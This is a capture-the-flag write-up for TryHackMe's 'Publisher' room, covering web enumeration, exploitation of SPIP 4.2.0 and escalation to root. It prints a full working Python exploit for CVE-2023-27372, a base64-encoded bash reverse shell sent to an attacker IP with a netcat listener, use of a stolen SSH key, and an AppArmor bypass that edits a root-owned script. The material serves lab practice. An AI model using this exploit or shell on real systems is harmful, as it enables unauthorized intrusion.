# Publisher
<br/>

## Intro
Welcome to the Publisher challenge provided by TryHackMe, here is the link to the [room](https://tryhackme.com/r/room/publisher).
This time we are gonna practice with some web enumeration in order to find a vulnerable service to exploit and get an initial access to the target machine. Leater on we will have to escalate our privileges to root abusing a missconfigured application.

Whenever you feel ready press "start the machine" and connect via OpenVPN or using the AttackBox

<br/>
<br/>

## The Challenge
For this challenge i have decided to rely, for the enumeration phase, to rely solely on a script that i have created called "[easyscan](https://github.com/Maat-Cyber/Maat-Cyber-World/blob/345af89c317ba7e4174a8f1d639d9a8c48eecb4c/Bash-Scripts/EasyScan.sh)", it will do an nmap scan showing us that port 80 (http) and 22 (ssh) are open.
Moving on, fuzzing for subdomains we get no matches but we can find 2 "hidden" directories: /images/ and /spip/

We can now navigate to the website and take a look at them, the images one appears to be of no interest for us, bu in the other one we have  the chance to pass some input to the PHP backed.

In fact when we try to insert some random input we get this URL
```http
http://MACHINE-IP/spip/spip.php?page=
```
Our input gets URL encoded and appended to the URL.

Another thing to notice is the spip version 4.2.0, now we can look for known vulnerabilities.

We can either search online or on the local Kali ExploitDB directly with:
```bash
searchsploit spip 4.2.0
```

It comes out that there is an RCE exploit already waiting for us "`php/webapps/51536.py`" we can run it with python3
```bash
python3 exploit.py -u URL -c COMMAND-TO-EXECUTE
```

**Note**: i have personally had some problems, like some other users, with python running that script due to an urlib3 error (` module 'urllib3.util.ssl_' has no attribute 'DEFAULT_CIPHERS'`), since my system was already up to date and nothing worked even creating a custom virtual environment for it, we can modify the script to avoid that error.

I still suggest running any downloaded exploit in a virtual environment
```bash
python3 -m venv venv
source ./ven/bin/activate
pip3 install requests bs4 argparse
```


```python
#!/usr/bin/env python3

import argparse
import bs4
import requests

def parseArgs():
    parser = argparse.ArgumentParser(description="PoC of CVE-2023-27372 SPIP < 4.2.1 - Remote Code Execution by nuts7")
    parser.add_argument("-u", "--url", default=None, required=True, help="SPIP application base URL")
    parser.add_argument("-c", "--command", default=None, required=True, help="Command to execute")
    parser.add_argument("-v", "--verbose", default=False, action="store_true", help="Verbose mode. (default: False)")
    return parser.parse_args()

def get_anticsrf(url):
    r = requests.get('%s/spip.php?page=spip_pass' % url, timeout=10)
    soup = bs4.BeautifulSoup(r.text, 'html.parser')
    csrf_input = soup.find('input', {'name': 'formulaire_action_args'})
    if csrf_input:
        csrf_value = csrf_input['value']
        if options.verbose:
            print("[+] Anti-CSRF token found: %s" % csrf_value)
        return csrf_value
    else:
        print("[-] Unable to find Anti-CSRF token")
        return -1

def send_payload(url, payload):
    data = {
        "page": "spip_pass",
        "formulaire_action": "oubli",
        "formulaire_action_args": csrf,
        "oubli": payload
    }
    r = requests.post('%s/spip.php?page=spip_pass' % url, data=data)
    if options.verbose:
        print("[+] Execute this payload: %s" % payload)
    return 0

if __name__ == '__main__':
    options = parseArgs()

    # Disable SSL warnings and comment out the following lines
    requests.packages.urllib3.disable_warnings()
    #requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
    #try:
	#   requests.packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
    #except AttributeError:
     #   pass


    csrf = get_anticsrf(url=options.url)
    if csrf != -1:
        send_payload(url=options.url, payload="s:%s:\"<?php system('%s'); ?>\";" % (20 + len(options.command), options.command))

```

Now we have a working exploit!

As the command to execute we can choose a simple reverse shell in bash and apply some base64 encoding to avoid problems with the characters

Encoding the payload 
```bash
echo -n "bash -i >& /dev/tcp/YOUR-IP/1234 0>&1" | base64 -w0
```

Finally we have to set up a listener, we can use netcat:
```bash
nc -lvnp 1234
```


Run the exploit:
```bash
python3 exploit_fixed.py -u http://MACHINE-IP/spip -c "echo B64_ENCODED_REVERSE_SHELL_HERE | base64 -d | bash"
```

And we have now a shell as the user think!

We can get the first flag:
```bash
cat /home/think/user.txt
```


<br/>

### Privilege Escalation
The shell we got previously is pretty bad, but looking around in the home directory we can notice that in `.ssh` there is the ssh key for the sure.
We can copy it on our machine and save it as id_rsa, change it's permission:
```bash
chmod 600 id_rsa
```

And login via SSH:
```bash
ssh think@publisher.thm -i id_rsa
```

Now we have a more interactive and stable environment to play with.

```bash
find / -perm -4000 -type f 2>/dev/null
```

Nothing interesting is popping out.

Following the hint "look at apparmor profiles" i went to explore the `apparmor.d` directory:
```
cd /etc/apparmor.d
```

Here there is one interesting file called `usr.sbin.ash`, specifically this part:
```
  deny /opt/ r,
  deny /opt/** w,
  deny /tmp/** w,
  deny /dev/shm w,
  deny /var/tmp w,
  deny /home/** w,
  /usr/bin/** mrix,
  /usr/sbin/** mrix,
```

Reading this we can understand why (if you have tried to create a file) we can not make or download files on the machine, apparmor is blocking it on some directories.
If we watch it closely we can notice that 2 directories miss the "inheritance" of the deny
```bash
cd /var/tmp
cp /bin/bash .
./bash -p
```
`-p` to exclude its ability to read user files

Now we can try if it works by navigating to /opt which was forbidden for us
```bash
cd /opt
ls -la
```

Looks like we can list the files, we have bypassed the "deny read", maybe we can even edit files? as there is one script "run_container.sh" which is owned by root.

It comes out that we can edit it, now we can do whatever we like as the bash script  will run as root: this means that we can run as root any command, for the challenge let's just read the last flag:
```bash
#!/bin/bash

cat /root/root.txt
```

Now run it:
```bash
run_container
```

And here we have the root flag printed on the screen.

<br/>
<br/>

Congratulations you have successfully found the 2 flags and exploited the machine! 

Catch you in the next CTF 😃 
